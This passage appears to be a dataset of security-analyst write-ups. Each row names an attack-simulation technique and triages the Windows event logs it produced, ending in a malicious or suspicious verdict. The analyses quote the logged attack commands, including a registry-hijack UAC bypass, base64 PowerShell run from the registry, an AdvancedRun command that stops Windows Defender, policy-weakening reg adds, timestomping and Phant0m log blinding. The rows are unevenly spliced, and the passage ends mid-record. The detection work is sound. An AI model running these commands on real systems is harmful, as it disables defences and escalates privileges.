   - Implement and enforce stringent controls around administrative activities and review any anomalous user behavior.

This assessment indicates possible initial compromise indicators and necessitates deeper forensic analysis to ascertain any ongoing threats."
UACME Bypass Method 61,"Upon reviewing the provided Windows event logs, here are the key findings related to suspicious or potential malicious behavior:

1. **Command-Line Arguments and Process Execution:**
   - There's a notable command-line execution through `cmd.exe` for a potential file execution path that involves `uacme\61 Akagi64.exe`. This is suggestive of a potential attempt to conduct a UAC (User Account Control) bypass using a known tool called UACME which is often used in privilege escalation attacks. The path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\uacme\\61 Akagi64.exe` is atypical and generally not associated with benign operations.

2. **Processes with High Integrity Level:**
   - Processes such as `cmd.exe`, `whoami.exe`, and others are executing with high integrity levels, indicating they are running with administrative privileges. This can be normal in some situations, but combined with unusual command-line activity, it raises concerns about privilege escalation.

3. **Event IDs Indicating Privilege Assignments:**
   - Security logs contain multiple `4672` events, which signify that a privileged account logged on. These privileges include sensitive rights such as SeDebugPrivilege, which allows an account to debug processes, often targeted by attackers for privilege escalation.

4. **Frequent Use of `conhost.exe`:**
   - Multiple instances of `conhost.exe` are observed which could support scripted or automated activity, especially when considering its association with `cmd.exe`.

5. **Unusual Events Related to Windows Defender:**
   - The application logs indicate Windows Defender is running but do not show any alert activity despite suspicious logs indicating potentially harmful activity. 

**Final Assessment:**
Considering the logs, particularly the execution of suspicious commands using `cmd.exe` and the known use of a tool for bypassing user account control, it is reasonable to classify this behavior beyond mere suspicion. The execution traces and context suggest potential malicious activity aimed at evading security controls for privilege escalation.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:** Isolate the affected system (Server002) from the network to prevent any potential lateral movement or data exfiltration.
2. **Further Investigation:** Conduct a thorough forensic investigation on the machine to uncover any additional indicators of compromise or persistence mechanisms such as scheduled tasks or scripts.
3. **Audit User Accounts:** Verify all user accounts, particularly those with administrative privileges, to check for unauthorized additions or modifications.
4. **Update Security Measures:** Ensure security products like Windows Defender are updated and are alerting properly.
5. **Enhanced Monitoring:** Implement enhanced logging and monitoring for all systems within the network to detect similar behavior.
6. **Educate Users:** Increase user awareness on identifying potential phishing attempts or abnormal system behavior, which could lead to such compromise.

Taking these steps will not only help in addressing the current issue but also strengthen security posture against future threats."
Execute base64-encoded PowerShell from Windows Registry,"**Detailed Analysis of Logs:**

1. **PowerShell Log Analysis:**
   - The use of `IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String(...)))` indicates an attempt to execute base64-encoded content on a Windows machine. This is a common obfuscation technique used by attackers to hide malicious scripts.
   - A base64 string is stored in the registry key `HKCU:Software\Microsoft\Windows\CurrentVersion` under the name ""Debug"". This activity is atypical for standard operations and can be suspicious, especially when the value is executed via PowerShell using the ""IEX"" command (Invoke-Expression), which can run any PowerShell commands included in the decoded string.
   - The usage of `Set-ItemProperty -Force` to store the encoded command in the registry further emphasizes potential malicious intent, as this can facilitate persistence or further exploitation.

2. **Application Log Analysis:**
   - Nothing anomalous was detected in the application logs. Windows Defender is shown as operational, indicating active security measures.

3. **Sysmon Log Analysis:**
   - Multiple legitimate system binaries such as `whoami.exe`, `wevtutil.exe`, `wuauclt.exe`, and `SecurityHealthService.exe` were executed. These executions, in isolation, do not indicate malicious activity.
   - `PowerShell` execution with encoded commands is observed and corroborated with the events seen in PowerShell logs.
   - No typical Sysmon indicators of compromise (like abnormal network connections, process injections, etc.) are directly observable, but the suspicious Powershell activity could be an initial stage of a more complex attack.

4. **System Log Analysis:**
   - Regular update activities and log operations are observed. These seem consistent with typical Windows operations related to user profiles and updating components.

5. **Security Log Analysis:**
   - The presence of audit/privilege escalation events such as EventID 4672 is noted, indicating that a privileged operation was performed. This is rare for standard user activities and can correlate with elevated privileges required for certain malicious activities, such as those potentially facilitated by the PowerShell commands recorded.

**Assessment and Evaluation:**

The PowerShell logs indicate suspicious activity due to the execution of encoded PowerShell commands, which is a common technique used by attackers to obfuscate malicious intentions. The use of `Invoke-Expression (IEX)` and base64 encoding are known practices for executing potentially harmful scripts on Windows systems while bypassing direct detection.

There is no conclusive evidence in the logs pointing to immediate damage or specific malicious actions succeeding (like file deletions, data exfiltration, etc.), but the behaviors observed are aberrant from typical benign operations and warrant further investigation to ensure there is no ongoing compromise or latent threat.

**Resolution: SUSPICIOUS**
- The observed activity does not clearly demonstrate malicious activity but does not align with typical system operations either. Immediate further investigation should be conducted to decipher the base64 content, audit system changes (especially in registry and file system), and check for abnormal outbound network activity related to this machine.
- Recommendation: Quarantine the affected host, perform a comprehensive forensic investigation, including decoding and analyzing the base64 content, and assess if further containment or remediation measures are necessary."
Bypass UAC using Event Viewer (PowerShell),"### Analysis of Logs

#### Key Events and Observations

1. **Sysmon Events**

   - We observe multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
   - A particularly suspicious command-line pattern is visible where `powershell.exe` is used to modify the registry key for `.msc` file handling and subsequently executes `eventvwr.msc`.
   - The PowerShell command executed introduces a ""`New-Item`"" and ""`Set-ItemProperty`"" in a way that points to potential use for privilege escalation by setting the default command for `mscfile` open to `cmd.exe` which indicates a potential bypass technique.

2. **Security Events**

   - We see normal login events for the user `admin_test`, showing the presence of elevated privileges (`SeDebugPrivilege`, etc.), which is expected given the administrative role. However, the presence of these privileges combined with other event details could be part of abnormal behavior.

3. **Application Events**

   - Regular update service records and Defender state seem normal.

4. **System and Time Change Logs**

   - There appears to be a time skew where the time is set back several seconds. This can often be innocuous, relating to system time synchronization, but when combined with other malicious patterns (i.e., the registry manipulation), it may warrant further scrutiny.

5. **PowerShell Logs**

   - Consistent with Sysmon logs, the PowerShell logs confirm the behavior of potentially harmful command-line executions. The scripting seems targeted to manipulate default program handling using PowerShell, a known attack vector when trying to execute unapproved applications or gaining a foothold via default open handlers.
   
#### Suspicious/Malicious Elements

- **PowerShell Registry Manipulation**: The PowerShell command executed on `HKCU:\software\classes\mscfile\shell\open\command\` to redirect file opening to `cmd.exe` is a known technique to gain elevated command line access or bypass User Account Control (UAC). This is highly indicative of malicious activity.

- **Process Execution Pattern**: The combination of `wevtutil.exe` and `conhost.exe` alongside PowerShell script execution indicates scripted or programmatically driven tasks designed to exploit system resources or escalate privileges.

### Conclusion

Upon reviewing the logs, the activities showed suspicious and potentially malicious patterns characterized by the misuse of PowerShell and registry manipulation for privilege escalation purposes.

### Resolution

- **Resolution**: **MALICIOUS**

  The observed behavior of modifying registry keys associated with MSC file handling using PowerShell scripting suggests an exploit attempt for privilege escalation or unauthorized system control. This requires immediate attention and remediation actions such as revoking access, conducting a threat hunt on `SERVER002`, and confirming system integrity and user privileges.
  
### Recommended Actions

1. **Isolate the affected host** to prevent further damage or pivot within the network.
2. **Conduct a full forensic investigation** on the endpoint to determine the scope of compromise.
3. **Modify and audit user privileges** especially for elevated accounts like `admin_test`.
4. **Further monitor** for any additional anomalous behavior stemming from this account or system.
5. **Review security controls** around PowerShell and registry operations to improve detection and prevention mechanisms.
6. **Apply additional endpoint protections** and update antivirus signatures.
7. **Reinstate system time-synchronization protocols** and ensure accurate logging. 

These steps should help contain and remediate the identified threat while preventing future occurrences."
Mshta used to Execute PowerShell,"Upon reviewing the event logs provided, several areas of concern regarding potential malicious activity have been identified:

1. **Suspicious Command Execution:**
   - The execution of `mshta.exe` with a command line indicating VBScript execution and initiation of PowerShell is highly suspicious. The command appears to be attempting to execute PowerShell commands via a macro-like script embedded within an HTML Application (HTA). This is a technique often used by attackers to execute scripts or commands in a stealthy manner.

2. **Observed Execution Flow:**
   - A `cmd.exe` process is observed launching `mshta.exe` with the significant payload `""about:<hta:application><script language=""VBScript"">Close(Execute(""CreateObject(""""Wscript.Shell"""").Run%%20""""powershell.exe%%20-nop%%20-Command%%20Write-Host%%20Hello,%%20MSHTA!;Start-Sleep%%20-Seconds%%205""""""""))</script>'""`. This indicates the use of `mshta` to run an HTA file that, in turn, executes PowerShell. The string `-nop -Command Write-Host Hello, MSHTA!;Start-Sleep -Seconds 5` shows PowerShell invoked with the `-nop` (no profile) and `-Command` arguments, which is often a method seen in malicious usage to evade detection.
   - This PowerShell instance, with a high integrity level, hints at possible privilege escalation or misuse.

3. **High Integrity Level Process:**
   - The processes associated with this activity (`cmd.exe`, `mshta.exe`, and `powershell.exe`) are all executed within a high integrity context. This indicates administrative privileges, which in the context of suspicious scripting and execution flow, poses a potential security risk.

4. **Anomalous Behavior:**
   - The occurrence of `wevtutil.exe` and `conhost.exe` run multiple times in quick succession is not inherently suspicious but could be additional context worth investigating, especially if combined with the other suspicious activities.

5. **Network Service Processes:** 
   - Processes such as `svchost.exe` and `sppsvc.exe` are normal Windows operations however, their occurrence should be examined within the timeline for unusual patterns regarding the suspicious activities noted.

**Conclusion:**
The actions described, particularly the execution of commands through `mshta.exe` using PowerShell, indicate a sophisticated attempt to execute malicious instructions possibly leading to a compromise. Such techniques are widely recognized as a method used by attackers to perform various malicious activities while attempting to avoid detection.

**Assessment and Resolution:**
The provided log entries contain activity associated with known malicious techniques and therefore qualify as **MALICIOUS**.

**Guidance on How to Proceed:**
1. Initiate an immediate containment protocol to isolate the affected machine to prevent further propagation or compromise.
2. Conduct a full analysis of the impacted systems to identify any potential data at risk, trace any access to files or network locations, and understand the scope of the intrusion.
3. Deploy enhanced monitoring and logging to capture further activity related to this vector in case of ongoing attacker activity.

Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement,"### Analysis of Logs:

Upon reviewing the provided event logs, there are several noteworthy observations that could potentially indicate malicious activity:

#### Sysmon Log Observations:
1. **Processes of Interest:**
   - **PowerShell Execution:** Multiple instances of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` seen in the logs.
   - **Suspicious Command Execution:** A PowerShell command involving `Invoke-ATHHTMLApplication`, which may be related to HTML Application attacks or Script Execution, is executed using PowerShell. This is often indicative of an attempt to download or execute code, possibly from a remote source. The specific command line used is:
     ```
     powershell.exe & {Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe}
     ```
   
2. **Wevtutil & Conhost Executions:**
   - Numerous executions of `wevtutil.exe` and `conhost.exe`. While `conhost.exe` is not inherently malicious, heavy usage in conjunction with potentially malicious PowerShell commands may suggest an attempt to obfuscate activity or manipulate logs (`wevtutil.exe` is often used to clear Windows event logs).

#### PowerShell Log Observations:
1. **Potential Obfuscation or Unusual Commands:** The command noted earlier involving `Invoke-ATHHTMLApplication` suggests execution of potentially harmful scripts. PowerShell is frequently used by attackers due to its powerful capabilities and presence in most Windows environments, particularly with script execution policies that are not restrictive (`-ExecutionPolicy Restricted` with further manipulations seen).

2. **PowerShell Engine Start and Stop Events:** Indicate PowerShell sessions starting and stopping, which could be normal, but should be verified against expected use patterns on a sensitive machine like a CEO’s computer.

#### Application and System Logs:
1. **Microsoft-Windows-Sysmon and -Security SPP Events:** No immediate indications of log tampering, although significant use of administrative tools requires further examination of intent.

2. **Software Updates:** The system logs reveal typical update activity for Windows applications and libraries. There are no immediate malicious indicators here.

### Assessment:

Given the evidence presented in the logs, the activities associated with PowerShell, particularly the suspicious command involving `Invoke-ATHHTMLApplication` and potential use of `wevtutil.exe`, suggest the possibility of malicious intent. This is especially concerning on a high-profile system such as that of the CEO's computer. It’s important to emphasize the signs of possible compromised scripts or attempts at lateral movement as indicated by the command parameters.

### Recommendation:

- **Resolution:** **MALICIOUS**
- **Threat/Risk Mitigation:**
  - Immediate suspension of any suspicious accounts observed executing these commands or processes.
  - Conduct a full threat hunt specifically focused on other instances of PowerShell script executions.
  - Review host and network security configurations, particularly script execution policies and audit logs.
  - Check for unauthorized remote connections or data exfiltration attempts.
  - Engage an incident response team to conduct deeper investigation into potentially compromised systems for containment, eradication, and recovery.
- **Further Investigation:**
  - Review all logs surrounding these events for any anomalies.
  - Investigate the current state of the machine, verifying the integrity of system and application files.
  - Ensure endpoint detection and response (EDR) solutions are actively providing coverage and alerts for future suspicious activities. 

Understanding intent and identifying the potential scope of compromise will be critical in mitigating risks and reinforcing security on sensitive devices across the organization."
Compiled HTML Help Local Payload,"Based on the provided logs, let's analyze the activities and determine whether there are indicators of compromise or malicious behavior.

### Analysis:

#### Security Logs:
- **Event ID 4624**: This is a logon event. A LogonType of 3 indicates a network logon, which is common for remote access. The log shows successful logons for the user ""admin_test"" from workstation ""DESKTOP-3HL5B2P"".
- **Event ID 4672**: Indicates special privileges were assigned upon logon. The user ""admin_test"" was granted a wide range of privileges such as SeDebugPrivilege, which are generally sensitive and can be used in privilege escalation.

#### Application Logs:
- The logs indicate that Windows Defender is enabled. This fact doesn't directly suggest any malicious activity.

#### Sysmon Logs:
- **Process Execution & Command-Line Activity**:
  - Powershell.exe, wevtutil.exe, cmd.exe activity: The user ""admin_test"" executed these processes. While PowerShell and Wevtutil are legitimate tools, they are often used by attackers for various malicious activities such as data exfiltration and event log clearing. No clear, malicious command lines are identified here, but it’s suspicious considering the timing and the user’s privileges.
  - Execution of hh.exe with a CHM file: While CHM (Compiled HTML Help) files are legitimate, they have been used to deliver payloads in attacks. The execution from a temporary directory is a red flag.
  - HOSTNAME.EXE and WHOAMI.EXE executions, seem investigative, which could be legitimate or reconnaissance behavior.

#### Key Observations:
1. The presence of sensitive privileges being assigned to a user who logs in remotely from an external IP is suspicious. This might potentially be a lateral movement or privilege escalation attempt.
2. The execution of PowerShell and Cmd without clear benign purposes and a CHM file being opened could represent suspicious activity, especially under a privileged account.
3. Tempering indicators, such as multiple process executions closely timed, may be indicative of script-based automation, possibly by an attacker.

### Final Assessment:

After reviewing the logs, while not explicitly malicious, the actions are highly suspicious, given the sensitive privileges and types of commands executed. 

The activity particularly needs further investigation focusing on:
- Confirm the legitimacy of the ""admin_test"" account and the source system ""DESKTOP-3HL5B2P"".
- Check if the executed scripts and CHM file are meant for legitimate administrative tasks.
- Investigate network logs for unusual connections corresponding to the time of remote logins.

### Resolution: **SUSPICIOUS**

Further investigation is required to confirm whether these activities were legitimate or part of unauthorized access or an exploitation attempt."
Windows - Modify file creation timestamp with PowerShell,"## Detailed Analysis of the Windows Event Logs

### Overview:
The provided logs are from various sources including Sysmon, Application, System, Security, and Windows PowerShell logs. They primarily capture process creation, service logs, time modifications, and PowerShell activity on a computer named **Server002**.

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - Several Sysmon and PowerShell logs record the execution of PowerShell scripts. A notable entry is the use of `timestomp` technique via PowerShell to backdate files. This command execution attempt could be an indicator of an attempt to obfuscate activities or tamper with forensic timelines:  
     ```
     ""powershell.exe"" & {Get-ChildItem ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.006_timestomp.txt"" | % { $_.CreationTime = ""01/01/1970 00:00:00"" }}
     ```

2. **Frequent Launch of `wevtutil.exe`:**
   - Multiple entries of `wevtutil.exe` indicate it was used, possibly, to manipulate or clear logs. This isn't inherently malicious but is often associated with attempts to cover tracks.

3. **Multiple `svchost.exe` Instances:**
   - Often a common Windows process, `svchost.exe` can be used maliciously. Its notable multiple appearances with different `ProcessId`s require assurance that these instances are legitimate and not masquerading threats.

4. **System Time Changes:**
   - The log records changes in system time which can be benign due to synchronization with a time server but can also be leveraged by attackers to manipulate timestamp-based logs or affect the scheduling of time-sensitive tasks.

5. **Edge Update Unusual Behavior:**
   - The logs show frequent Microsoft Edge Update process creation which should coincide with legitimate update activity. The locations and types of Edge update processes should be validated against known update signatures and schedule.

### Indicators of Malicious Activity:

- **Timestomp Technique:**
  - The use of `timestomp` to alter file timestamps is a common technique used by attackers to hide the presence of malicious files and tamper with creation and modification times for forensic investigations.

- **Consecutive Use of PowerShell and `wevtutil.exe`:**
  - While the execution of PowerShell is not inherently dangerous, executing observable system administration tasks and potential data exfiltration or system information retrieval within a short period is worrisome. Additionally, use of `wevtutil.exe` shortly afterwards could imply an attempt to manipulate logs post-execution.

### Assessment:
The analysis revealed several indications of potentially malicious behavior, particularly with the use of `timestomp` via PowerShell, the frequent executions of `wevtutil.exe`, and unexplained system time changes.

### Recommendation:
1. **Further Investigation:**
   - **Immediate check on user activities, especially `admin_test`**: Verify with the admin if these actions were intended and what the purpose was.
   - **Conduct a comprehensive forensic analysis**: Especially around the timestamps modified with `timestomp`.
   - **Examine the integrity and execution history** of `svchost.exe` instances to rule out any disguise.

2. **Contain and Remediate:**
   - If found unauthorized, restrict PowerShell usage to essential administrative actions and log all activities.
   - Validate and cross-reference Edge updates schedule and activities.

3. **Secure and Monitor:**
   - Enable enhanced monitoring on sensitive accounts like `admin_test`.
   - Conduct regular log reviews.

### Final Resolution:
**SUSPICIOUS** - The logs contain activities that are suspicious, particularly with PowerShell commands and use of `timestomp`. Immediate investigation and verification are warranted."
Odbcconf.exe - Load Response File,"After reviewing the provided logs from the Windows event log and Sysmon logs, here is a detailed analysis of the entries, highlighting suspicious activities and determining their nature:

### Analysis:

1. **EDR Alert Trigger:**
   - There is an alert related to the CEO's machine. One potential trigger is the process activity related to `cmd.exe` executing with command line entries involving `odbcconf.exe` in a temporary user directory:
     ```
     ""cmd.exe"" /c cd ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.008\bin\"" & odbcconf.exe -f ""data.008.rsp""
     ```
   - Here's why this stands out:
     - **Command Line Execution:** This script manipulation and execution from a temporary directory by `cmd.exe` is often indicative of malicious activity, as it is a typical behavior for malware trying to execute additional payloads or configuration files.
     - **`odbcconf.exe`:** This utility can be abused for proxy execution of commands, often referred to as a Living-Off-the-Land Binaries (LOLBins) technique.
     - **Integrity Level:** The process is running at a high integrity level, allowing it to perform privileged system tasks.

2. **Unusual Use of `wevtutil.exe`:**
   - Multiple entries for the process `wevtutil.exe` are observed, exporting logs, which is unusual unless for legitimate administrative purposes.
   - In combination with potential indicators of compromise, this might suggest an attempt to delete or tamper with logs to cover tracks which is a common tactic in a post-exploitation phase.

3. **Multiple Instances of `EdgeUpdate` Processes:**
   - Numerous system-level execution entries related to Microsoft Edge updates are seen in the logs. While they seem legitimate, the processes and their commands appear noisy in logs. 
   - It's worth noting Edge updates are frequent but the unusual path or invocation might be potentially used as a pivot mechanism.

4. **High Privilege Logon Session:**
   - Logon events (Event ID 4624) and Special Privileges (Event ID 4672) show the `admin_test` account acquiring extensive privileges, including `SeDebugPrivilege`. 
   - Although this might be part of legitimate admin activities, the context combined with other suspicious processes suggests needing further checks.

### Situation Assessment:

Based on the provided logs, several activities can be delineated:
- **We detect substantial activity around process creation and execution, some being routine system activity (like Edge updates), combined with suspicious command-line execution involving `cmd.exe` and ODBC configuration, which is usually not common behavior and indicative of possible malicious activity.**
- **There is clear activity of `wevtutil.exe` being used, possibly for log tampering.**

### Conclusion & Resolution:
**Resolution: SUSPICIOUS**

### Guidance:
- **Further Investigation:** Examine the detailed command lines associated with `cmd.exe` execution and look for corresponding evidence in other logs or EDR digital footprints showcasing process activity to determine data exfiltration, post-compromise tools uses, or further actions.
- **User Validation:** Conduct interviews or checks for the user `admin_test` to assess if such administrative privilege use was intended.
- **Log Review:** Manually inspect the integrity and completeness of event logs if possible, or compare with a non-compromised system for discrepancies.
- **Increase Monitoring:** Escalate monitoring on processes spawned from temporary paths and all executions of `wevtutil.exe` and high integrity processes.
- **Implement Threat Intelligence:** To better correlate these suspicious activities with known indicators of compromise and tactics used by threat actors. 

This resolution and recommendations should be validated with any additional context or corroborative logs not provided here for a complete assessment."
Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value,"Upon reviewing the provided Windows event logs, several key aspects must be considered to determine if there's any indication of malicious activity:

### Analysis Summary:

1. **Edge Update Activity**:
   - Numerous events involve Microsoft Edge Update processes executing, such as `MicrosoftEdgeUpdateSetup.exe`, `MicrosoftEdgeUpdate.exe`, and `MicrosoftEdgeUpdateComRegisterShell64.exe`. These processes exhibit behavior typical of application updates, including running with NT AUTHORITY\SYSTEM privileges and utilizing command lines associated with software updates.
   - Frequent stops and starts of the Edge Update service are recorded, which is standard behavior during installation or update procedures.

2. **Suspicious Commands and Processes**:
   - A command was executed via `cmd.exe` that modifies the registry: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f`. This could indicate an attempt to modify security settings related to external device sign-on. While not inherently malicious, it is noteworthy because these settings should be modified with caution as they affect system security policies.
   - Additionally, the process `whoami.exe` was executed. This process is commonly used to display the current user's information, which could indicate reconnaissance activity.

3. **User Accounts**:
   - Most of the suspicious activities, especially those outside of typical Edge update behavior, are executed by a user `SERVER002\admin_test`, which could be an administrative account. This user executed several processes like `wevtutil.exe`, `conhost.exe`, and the aforementioned registry modification commands.

4. **Usage of System Utilities**:
   - The presence of `wevtutil.exe` executions might be legitimate if associated with log management, but it could indicate log clearing or querying for malicious purposes.

### Suspicion Analysis:

- The combination of using a utility like `wevtutil.exe` (with the absence of parameters made clear in the logs but often used for log queries/manipulation), the execution of `whoami.exe`, and the registry change could indicate a potential for malicious behavior.
- However, the frequent activity related to Edge Update processes strongly suggests much of the activity around `NT AUTHORITY\SYSTEM` is routine update behavior.

### Conclusion:

- **Resolution**: **SUSPICIOUS**
  - Although much of the activity aligns with legitimate software update processes, specific entries related to registry changes and utility executions by an administrative user warrant further investigation.
  - Follow-up actions should include reviewing the context behind the registry modification, confirming whether the `admin_test` account should have run such processes, and ensuring that the behavior aligns with authorized administrative activity. Additionally, check for more extensive logs or monitoring data around the time of these events for a complete picture of user and process activities."
Disable Defender Using NirSoft AdvancedRun,"### Analysis of the Logs

#### Indicators of Suspicious Activity

1. **PowerShell Execution**: The Sysmon logs show the execution of `powershell.exe` with suspicious command-line arguments aimed at stopping the Windows Defender service (`WinDefend`). This command is executed from a non-standard directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\..`). Notably, the use of `AdvancedRun.exe` by NirSoft, which is a legitimate tool but can be misused for malicious activities, is a red flag.

   - **Relevant Log Entries**:
     - Timestamp: `2024-10-28 09:10:00.142`
     - Process: `WindowsPowerShell`
     - Command Line:
       ```
       ""powershell.exe"" & {Try {cmd /c \""""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AdvancedRun.exe\"""" /EXEFilename \""""$env:systemroot\System32\sc.exe\"""" /WindowState 0 /CommandLine \""""stop WinDefend\"""" /StartDirectory \""""\"""" /RunAs 8 /Run} Catch{}}
       ```

2. **Unusual Commands and Privilege Escalation**: The execution of `cmd.exe` with arguments passed to `AdvancedRun.exe` suggests an attempt to manipulate system services. This sequence attempts to use elevated privileges (`RunAs 8`) to stop the Windows Defender service.

   - **Relevant Log Entries**:
     - Command Line: 
       ```
       cmd /c C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AdvancedRun.exe /EXEFilename C:\Windows\System32\sc.exe /WindowState 0 /CommandLine ""stop WinDefend"" /StartDirectory  /RunAs 8 /Run
       ```

3. **Frequent `conhost.exe` Executions**: There are multiple instances of `conhost.exe` execution around the same time, indicating potential console activities. These appear to support suspicious activities driven by other processes, such as `PowerShell` and `cmd.exe`.

4. **Tampering with Security Configurations**: Use of commands in an attempt to stop Windows Defender and remove its directory is highly suspicious as it indicates an attempt to disable security monitoring.

5. **Peripheral Updates Appearing Benign**: There are many entries related to Microsoft Edge Update processes running under `NT AUTHORITY\SYSTEM` which are expected for updating purposes. While this activity is generally benign, its occurrence in concert with the suspicious PowerShell and cmd activities could indicate an attempt to mask malicious activities.

#### Findings and Assessment

- **Primary Findings**:
  - Anomalous use of PowerShell and command prompt scripts to execute potentially harmful actions.
  - Execution of tools and commands (AdvancedRun) to modify or stop critical security services (Windows Defender).

- **Indicators of Compromise**:
  - Use of legitimate administration tools like `AdvancedRun.exe` for potentially malicious actions.
  - Unusual sequence and method of process execution focused on disabling security services.

### Conclusion and Recommendation

**Resolution: MALICIOUS**

Based on the analysis of these logs, the activities are consistent with a sophisticated attempt to compromise the system by disabling security defenses using elevated permissions. As a result, these activities should be treated as malicious. Immediate action is required to contain the incident.

**Recommended Actions**:
1. **Immediate Response**: Isolate the affected system (Server002) to prevent further spread or data exfiltration.

Modify UsePIN Registry entry,"Upon reviewing the provided Windows event logs for the machine identified as 'Server002,' several key observations and potential indicators of suspicious activity have been found.

### Analysis

1. **Time Changes**:
   - The logs indicate a series of time changes (Event ID 4616) managing the system time by the `svchost.exe` process, which is not inherently suspicious but could suggest attempts to manipulate time-sensitive operations or potentially conceal activity. However, the process runs under `NT AUTHORITY\LOCAL SERVICE`, which is typical for this kind of activity.

2. **Process Execution**:
    - Frequent execution of the Microsoft Edge update service `MicrosoftEdgeUpdate.exe` and related processes (`MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) is noted. Most of these instances are operated under `NT AUTHORITY\SYSTEM`, which is expected, as these are legitimate update operations. There is, however, a concerning amount of temporary file executions and repeated updates, which may need further investigation to confirm they aren't being abused for malicious intents, especially given how they appear cyclically.
   
3. **Suspicious Command Line Invocation**:
   - The execution of `cmd.exe` with command-line arguments modifying the registry (`""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f`). Registry changes performed by non-administrative users or processes can be indicative of policy changes that's not part of a normal update process and can lead to a potential security risk.
   
4. **Privilege & Integrity Level**:
   - Processes such as `wevtutil.exe` and `conhost.exe` executed by the user `SERVER002\admin_test` under high integrity levels could indicate privilege abuse or escalation attempts, especially when using `wevtutil.exe`, which is generally used for events and logs management, potentially signaling an attempt to extract or tamper with logs. 

### Conclusion and Recommendations

**Resolution:** SUSPICIOUS

- There are no outright signs of malicious activity though there are indicators warranting further investigation, particularly the registry changes and frequent updates.
- Recommendation:
  - Verify if the registry modification aligns with the company's IT policies or if it was performed under authorized maintenance operations. Check for approvals and administration logs if any policy change requests have been recently approved.
  - Ensure the authenticity and integrity of the Microsoft Edge update processes to confirm they are legitimate and not malicious impersonators.
  - Monitor the user `admin_test` for unusual access patterns or privilege escalations beyond regular administrative duties.
  - Review additional security logs not provided here to investigate the context of the registry changes and any potential unauthorized access attempts or configuration manipulation activities.
  - Execute a security audit of the software protection state allowing Microsoft Edge updates to flexibly ensure no unauthorized modification of security policies."
Makes Eventlog blind with Phant0m,"In analyzing the provided Windows event logs, several aspects of potential suspicious activity have been observed, warranting a deeper investigation. Below is a detailed analysis:

1. **Sysmon Log Analysis**:
   - The initiation of multiple instances of `powershell.exe` by the user `SERVER002\admin_test` can be normal but often merits scrutiny, especially if no specific benign task justifies it and considering its common use in attack vectors.
   - Use of `wevtutil.exe`, which is a legitimate tool used for managing event logs, appears multiple times under `SERVER002\admin_test`. While not inherently malicious, frequent use may indicate attempts to manipulate or tamper with event logs, potentially to cover tracks.
   - The entry with `cmd.exe` executing `Phant0m.exe`, located at a Temp path, is highly suspect. `Phant0m`'s mention is notorious as malware and is often associated with killing event log processes to evade detection.
   - Additional PowerShell or unusual console processes (`conhost.exe`) in quick succession may support a case where automation/scripts are running, either legitimately or illicitly.

2. **Application and Security Logs**:
   - Instances of `sc.exe` initiating services like `wuauserv` (Windows Update) and `pushtoinstall registration` indicate possible manipulation of Windows services. While not automatically indicative of maliciousness, they could be used for lateral movement in a compromised system or to maintain persistence.
   - Event IDs like 4672 indicate the use of special privileges, such as `SeDebugPrivilege`, often leveraged in various attack frameworks for privilege escalation.
   
3. **Security Concerns**:
   - The launch of `Phant0m.exe` is definitive of a known technique to disable logging—it's a clear indicator of compromise (IoC) and typically utilized by adversaries to hide traces.
   - The consistent use of administrative/service accounts to run processes could indicate credential misuse or pass-the-hash style attacks.

**Assessment**:
Given the presence of `Phant0m.exe`, known for malicious activity aimed at hiding traces by tampering with logging services, combined with the auxiliary suspicious processes such as repeated `powershell.exe` runs and unusual service manipulations, there is enough evidence to consider this activity as a compromise.

**Resolution**: **MALICIOUS**

**Guidance**: 
- Immediate containment and eradication actions should be initiated, including isolating the host from the network.
- Conduct forensic analysis to assess the extent of the intrusion, focusing on the Temp directory for unauthorized applications or scripts.
- Review and reset impacted credentials, particularly those with administrative privileges.
- Enhance logging and monitoring solutions to detect and prevent similar tactics in the future, focusing on unauthorized script executions and service manipulations."

#### Application Logs:
1. **Service Stopped Events:**
   - Edge Update Service stopped twice. The entries are very close in time, suggesting a typical update or internal restart sequence.

#### Sysmon Logs:
1. **Process Execution:**
   - **Multiple Executions involving `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`:**
     - The process executions (e.g., `wevtutil.exe`, `whoami.exe`, `hostname.exe`) by `SERVER002\admin_test` suggest typical administrative maintenance activities, likely related to event log manipulation and system checks.
   - **Registry Modifications via `cmd.exe` invoking `reg.exe`:**
     - A `cmd.exe` process executed a command to modify registry keys related to file visibility settings (`ShowSuperHidden` and `Hidden`). This operation executed with high integrity level could be part of an administrative task or may warrant further investigation if not an approved script.
   - **Edge Update Activities:**
     - Multiple updates by `Microsoft Edge Update` processes are logged. This corresponds with `edgeupdate` service activities noted in the application log. This looks typical for system updates initiated by Microsoft components.

#### Security Logs:
1. **Time Change Verification:**
   - The security logs document system time changes, corresponding to the system logs, aligning with expected automated time synchronization.

### Assessment:
- **Time Synchronization:** The time change events are consistent with NTP service synchronizations and pose no immediate concern. No evidence of manual intervention.
- **Administrative Tasks:** Executions of `wevtutil`, `hostname`, `whoami`, etc., by `SERVER002\admin_test` suggest regular administrative actions. Registry edits via `reg.exe` should be confirmed for legitimacy due to potential security implications on default visibility settings.
- **Microsoft Edge Update Processes:** A high volume of Edge Update related processes suggesting a regular software update cycle is taking place, consistent with benign update behavior.

### Threats or Risks:
